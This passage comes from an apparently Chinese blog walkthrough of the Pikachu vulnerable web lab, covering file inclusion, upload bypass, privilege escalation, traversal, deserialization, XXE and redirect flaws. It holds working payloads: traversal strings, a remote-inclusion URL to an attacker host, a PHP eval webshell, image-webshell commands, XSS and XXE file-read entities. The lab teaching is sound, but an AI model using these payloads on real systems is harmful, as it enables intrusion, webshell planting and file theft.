应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/5008d2404e83e39142b33924034ef3de.png"></p><p>由于搭建本靶场使用的是 Windows 系统，所以本关可以利用本地文件包含漏洞包含一些 Windows 系统中的敏感文件，比如<code>hosts</code>文件，直接将 URL 中的 filename 的值修改为以下路径即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f417a0e3f1a05cb5323451642179e5ee.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9c52f41467c89b4e2026c6a23d0146a2.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/2e2dd86dfe8c80c76b2ed4aeeed48da4.png"></p><h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/2526f8a5d7830f1d0fa0c33e24845687.png"></p><p>allow_url_include &#x3D; Off 是否允许 include&#x2F;require 打开 URL（如 http：&#x2F;&#x2F; 或 ftp：&#x2F;&#x2F;）作为文件处理。</p><p>注意：从<code>PHP5.2</code>开始<code>allow_url_include</code>就<strong>默认</strong>为<code>Off</code>了</p><p>这里我们需要修改下 php.ini 配置文件，保存后重启 Apache 服务</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0460b88a6293f32f3109123f9641d18d.png"></p><p>再次访问已经正常了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/af5bbedec1a5b7de939b2fccf653f5a5.png"></p><p>由于本关是远程文件包含，所以这里我们需要准备一台攻击机，在这台攻击机上创建以下 php 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/a6767cef798ad3b8a4606a4029bcc247.png"></p><p>然后使用 python 启动 http 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b653cba5ec38ee8a376f7edfb14a0b35.png"></p><p>此时将攻击机 php 文件的 URL 粘贴到 filename 的参数中，访问后成功显示了 phpinfo 的页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=http://192.168.0.106:8080/a.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9d6a98d61cddbbbd74902210f3141cf1.png"></p><h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><p>文件下载功能在很多 web 系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件 response 给浏览器，从而完成下载。 如果后台在收到请求的文件名后, 将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径 (比如…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passwd), 则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等) 被下载。</p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3fd6f2280245e2aebc0be61ec7db6322.png"></p><p>根据提示信息已知点击球员名字即可下载头像图片</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9b8a71533f4cfe150f19e18785a8434d.png"></p><p>这里可以使用 burp 看下下载的请求包内容，此处传入了图片的文件名然后进行下载</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5020cd2c77be2a1b5f3d1f394942b486.png"></p><p>本关我们仍然可以将 filename 设置为 hosts 文件的路径，然后进行下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/d93e39b0c16e9aac24d7fd868f35cf15.png"></p><h2 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h2><p>不安全的文件上传漏洞概述</p><p>文件上传功能在 web 应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被 webshell。</p><p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/140c7888170f91f998248cf3bfb478f2.png"></p><p>本关由于是前端校验，所以可以直接右键查看网页源代码中 js 的判断逻辑</p><p><img src="https://img-blog.csdnimg.cn/img_convert/80f65712375c00aa198a8e84db561cfe.png"></p><p>本关有两种方式进行绕过：</p><p>第一种是直接使用网页插件禁用 JS 然后进行上传</p><p>比如 Chrome 浏览器的<code>Quick Javascript Switcher</code>插件，关闭 JS 后</p><p><img src="https://img-blog.csdnimg.cn/img_convert/51b659e3527feb6f05e89d3ecc503fd7.png"></p><p>点击选择文件，这里我们直接上传 php 一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f7801fe2c29c786f8140df60ec98c997.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c59356ad3ea660fa482d31ca9b1eda51.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/78c147086d5bb51bbcbf39e12e8911f7.png"></p><p>然后使用蚁剑进行连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vul/unsafeupload/uploads/a.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9a93dda51a6c6a371703af875a803cf0.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6b2d43caf2c121118059420eede8b30e.png"></p><p>第二种先上传个正常的图片文件然后开启 burp 抓包修改内容和后缀完成上传，这里就不做演示了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/74259d6191d7c1cb457f591f531b79f1.png"></p><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/636e9700ba038c7cfa4ed5f8b1ba2441.png"></p><p>本关检测了 MIME type 文件上传类型，本关只需要将上传请求的 Conten-Type 改为图片类型即可完成上传</p><p>首先上传了一张图片，可以看到 Conten-Type 为 image&#x2F;png</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0521db18a8f6ac1280f068ab10c4e68e.png"></p><p>然后将该请求包发送至 Repeater 模块中 将内容修改为一句话木马，将文件后缀改为 php 然后发送请求</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fcfdb50a312c1142d60a77a169cdadb0.png"></p><p>使用蚁剑进行连接</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3a4371ec16144dbc337251bacd1e7cdf.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/efc5ab0910835b339bb861e8529bd634.png"></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>PHP 中的 getimagesize() 函数是一个内置函数，用于获取图像的大小。Getimagesize() 返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a04e445bf9f197483b8ed6d5b47aa669.png"></p><p>本关需要上图片马并且需要配合本地文件包含漏洞来进行利用</p><p>图片马制作：</p><p>方法 1：直接伪造头部 GIF89A</p><p>方法 2：CMD：copy &#x2F;b c.png + a.php test.png Linux&#x2F;Mac：cat a.php &gt;&gt; c.png</p><p>方法 3：使用 GIMP(开源的图片修改软件)，通过增加备注，写入执行命令</p><p>制作成功的图片马：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/29359b531240d9981fa694bc9c571f7a.png"></p><p>然后将该图片上传到服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图片保存的路径：unsafeupload/uploads/2022/10/30/830731635e401cf26d1112088349.png</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/655792c606d63deae24b631f4d75733f.png"></p><p>然后需要利用本地文件包含漏洞进行漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.103/vul/fileinclude/fi_local.php?filename=..\..\unsafeupload\uploads\2022\10\30\830731635e401cf26d1112088349.png&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/c2b7c232f74b7e285a6348d70bd98c37.png"></p><p>然后使用蚁剑进行连接</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1a3d538cfa4c6be45b15d4331a0eeabc.png"></p><h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><p>如果使用 A 用户的权限去操作 B 用户的数据，A 的权限小于 B 的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p><p>因此，在在权限管理中应该遵守：  </p><ol><li>使用最小权限原则对用户进行赋权;  </li><li>使用合理（严格）的权限校验规则;  </li><li>使用后台登录态作为条件进行权限判断, 别动不动就瞎用前端传进来的条件;</li></ol><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/efe03b046e3c6590d6c1f8249adb0684.png"></p><p>点击右上角提示得到如下三个账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lucy/123456</span><br><span class="line">lili/123456</span><br><span class="line">kobe/123456</span><br></pre></td></tr></table></figure><p>登录<code>lucy</code>账号，点击查看个人信息</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c4e97143446e8cb8fffbe6c4753e58f0.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/931911ba6b53bbf160ed9a656d7bcf3a.png"></p><p>此处将 url 中的 username 参数修改为<code>lili</code>，此时页面显示的个人信息就变成了该用户的信息，实现了平行越权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.103/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6cf41d5dde45e35e5d1a245cc34f66ad.png"></p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/9374722741f3c15e9781b351ae085870.png"></p><p>根据提示得知，本关有两个用户<code>admin/123456</code>,<code>pikachu/000000</code>, 其中 admin 是超级 boss 权限</p><p>首先分别登录 admin 和 pikachu 对比两个用户的权限差异，发现 admin 管理员比 pikachu 用户多了添加用户、删除用户的权限</p><p>pikachu 用户登录后的界面：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fe88fe9f96a53300dcd95fcad6afc9c1.png"></p><p>admin 用户登录后的界面：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3e065b19dc4c9f6a4796c7afdfb381f6.png"></p><p>使用 admin 用户进行登录，访问添加用户界面，获得以下 URL，然后点击退出登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/1b4203f1e4893856742fe600c0f033f1.png"></p><p>接下来使用 pikachu 用户登录系统</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4329296d6e3b88a93b19f064de0925b0.png"></p><p>登录之后直接将刚刚得到的添加用户的 URL 粘贴到地址栏进行访问，发现可以正常访问</p><p><img src="https://img-blog.csdnimg.cn/img_convert/345dc58c1d4439f9a83975ff218d270c.png"></p><p>接下来尝试新建个账号<code>kk/123456</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d25913ee501c5d44bd63e9fcb7828ab2.png"></p><p>创建成功后登录管理员账号查看用户列表，发现已经添加成功了，此处就利用了垂直越权的漏洞创建了新用户。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/090f1d28e7f76e7f2be23b48b07324fe.png"></p><h2 id="…-x2F-…-x2F"><a href="#…-x2F-…-x2F" class="headerlink" title="…&#x2F;…&#x2F;"></a>…&#x2F;…&#x2F;</h2><p>在 web 功能设计中, 很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值 (比如文件名称) 传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过 “…&#x2F;” 这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p><p>看到这里, 你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p><p>需要区分一下的是, 如果你通过不带参数的 url（比如：<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82" title="http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。">http://xxxx/doc）列出了 doc 文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在 “i can see you ABC” 中了解更多）</p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/7a5948082a04ce478f5a69bce2f8ed85.png"></p><p>本关在点击 a 链接后页面回将该文件的内容显示在页面中</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5c3fe0709095a54fc82b35ecbe401e4f.png"></p><p>本关我们也可以去包含 hosts 文件，如果靶场为 linux 系统则可以去包含<code>/etc/passwd、/etc/shadow</code>等文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/2b70ed0a05e8b7682ea0736d8cc09098.png"></p><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问 url 下的目录，可以直接列出目录下的文件列表;<br>—输入错误的 url 参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p><p>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助, 甚至 “离谱” 的敏感信息泄露也会直接造成严重的损失。 因此, 在 web 应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</p><h3 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/2fb84b9dd4472262046bfc19bdb37c3f.png"></p><p>尝试 admin&#x2F;123456 进行登录提示账号不正确，之后审计前端代码发现注释中包含测试账号的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 测试账号:lili/123456--&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0b2bbae3f6416d6fad8a4620b8cbdcfb.png"></p><p>使用测试账号进行登录，登录成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/87ec4796e399d0b47516a14e8bee149d.png"></p><h2 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h2><p>在理解这个漏洞前, 你需要先搞清楚 php 中 serialize()，unserialize() 这两个函数。</p><p><strong>序列化 serialize()</strong> 序列化说通俗点就是把一个对象变成可以传输的字符串, 比如下面是一个对象:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    serialize($s); //把这个对象进行序列化</span><br><span class="line">    序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">        O:代表object</span><br><span class="line">        1:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        1:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        4:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        7:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br></pre></td></tr></table></figure><p><strong>反序列化 unserialize()</strong></p><p>就是把被序列化的字符串还原为对象, 然后在接下来的代码中继续使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">  echo $u-&gt;test; //得到的结果为pikachu</span><br></pre></td></tr></table></figure><p>序列化和反序列化本身没有问题, 但是如果反序列化的内容是用户可以控制的, 且后台不正当的使用了 PHP 中的魔法函数, 就会导致安全问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">        __construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">        __destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">        __toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">        __sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">        __wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">        漏洞举例:</span><br><span class="line"></span><br><span class="line">        class S&#123;</span><br><span class="line">            var $test = &quot;pikachu&quot;;</span><br><span class="line">            function __destruct()&#123;</span><br><span class="line">                echo $this-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $s = $_GET[&#x27;test&#x27;];</span><br><span class="line">        @$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">        payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP-反序列化漏洞"><a href="#PHP-反序列化漏洞" class="headerlink" title="PHP 反序列化漏洞"></a>PHP 反序列化漏洞</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/db5b1ddcaf731689626b28d7db743b20.png"></p><p>分析下源代码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3e7fe85abdec9bdfb390d06c196b5a6a.png"></p><p>代码的意思是把输入的内容进行反序列化生成对象实例，然后输出对象实例的 test 这个数据成员</p><p>接下来构造序列化代码，该漏洞有多种利用方式</p><p>打印输出 test1234</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;test1234&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/e772a32164717737d8fa39fa32e1e2dc.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7598a51b2284b438d9777cf1dd2a4a6a.png"></p><p>输出 xss payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/58923706b7e203f394f4788170fd2554.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/45ad278f630ffa97a459372b57f2c9b0.png"></p><p>实现网站恶意跳转至指定页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:64:&quot;&lt;script&gt;window.location.replace(&#x27;http://www.baidu.com&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/52dfbae0ab2d03b3733ca5ad97f4795f.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/91ace28759a398298cb18bffc86fbc2c.png"></p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE -“xml external entity injection”</p><p>既 “xml 外部实体注入漏洞”。</p><p>概括一下就是 “攻击者通过向服务器注入指定的 xml 实体内容, 从而让服务器按照指定的配置进行执行, 导致问题”</p><p>也就是说服务端接收和解析了来自用户端的 xml 数据, 而又没有做严格的安全控制, 从而导致 xml 外部实体注入。</p><p>具体的关于 xml 实体的介绍, 网络上有很多, 自己动手先查一下。</p><p>现在很多语言里面对应的解析 xml 的函数默认是禁止解析外部实体内容的, 从而也就直接避免了这个漏洞。</p><p>以 PHP 为例, 在 PHP 里面解析 xml 用的是 libxml, 其在≥2.9.0 的版本中, 默认是禁止解析 xml 外部实体内容的。</p><h3 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/f3b871b99e383d946bbf42fae179c323.png"></p><p>源代码分析</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4002f04f39fcbd3231dc7509f4f2c3d3.png"></p><p>simple_load_string() 函数，函数转换形式良好的 XML 字符串为 SimpleXMLElement 对象<br>在 PHP 里面解析 xml 用的是 libxml，其在 &gt;&#x3D;2.9.0 的版本中，默认是禁止解析 xml 外部实体内容的<br>xxe 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的 XML</p><p>使用以下 Payload 进行测试，成功打印 test</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!ENTITY hack &quot;test&quot;&gt;]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/715b81427b41b5aed1e921040f9be600.png"></p><p>接下来使用以下 payload 读取 hosts 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[ </span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/d6182c41ad4c07df07cd5f416e2acbe8.png"></p><h2 id="URL-重定向"><a href="#URL-重定向" class="headerlink" title="URL 重定向"></a>URL 重定向</h2><p>不安全的 url 跳转</p><p>不安全的 url 跳转问题可能发生在一切执行了 url 地址跳转的地方。</p><p>如果后端采用了前端传进来的 (可能是用户传参, 或者之前预埋在前端页面的 url 地址) 参数作为了跳转的目的地, 而又没有做判断的话</p><p>就可能发生 “跳错对象” 的问题。</p><p>url 跳转比较直接的危害是:</p><p>–&gt;钓鱼, 既攻击者使用漏洞方的域名 (比如一个比较出名的公司域名往往会让用户放心的点击) 做掩盖, 而最终跳转的确实钓鱼网站</p><h3 id="不安全的-url-跳转"><a href="#不安全的-url-跳转" class="headerlink" title="不安全的 url 跳转"></a>不安全的 url 跳转</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/b097b9df2df83d30b5f2e6e045edf4c4.png"></p><p>当点击 a 标签时候会进行跳转，使用 burp 进行抓包看看具体跳转的 url</p><p><img src="https://img-blog.csdnimg.cn/img_convert/43684c474ba4fea84af423506c9e217b.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/407a50fa8f8efc617df92aeac3c38c54.png"></p><p>测试直接将此处的 url 的值改为 <a href="http://www.baidu.com/">www.baidu.com</a> 发送请求包查看是否会跳转，经测试发现成功跳转至百度，此处存在 url 重定向漏洞，攻击者可以将该 url 发送给受害者点击，然后进行钓鱼攻击</p><p><img src="https://img-blog.csdnimg.cn/img_convert/51905227bdc7a584ddfb589ab80971e8.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/57bccc8de966438ac537839fd3302229.png"></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><strong>SSRF(Server-Side Request Forgery: 服务器端请求伪造)</strong></p><p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>, 但又没有对目标地址做严格过滤与限制</p><p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求, 并返回对该目标地址请求的数据</p><p>数据流: 攻击者 —–&gt; 服务器 —-&gt; 目标地址</p><p>根据后台使用的函数的不同, 对应的影响和利用方法又有不一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span 